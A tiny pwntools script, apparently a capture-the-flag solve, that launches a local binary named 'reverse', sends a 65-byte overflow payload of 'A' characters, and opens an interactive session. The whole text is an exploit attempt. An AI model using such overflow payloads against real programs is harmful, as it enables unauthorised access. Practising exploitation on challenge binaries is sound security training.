from pwn import *
r = process('./reverse')
payload = b'A'*65
r.sendline(payload)
r.interactive()
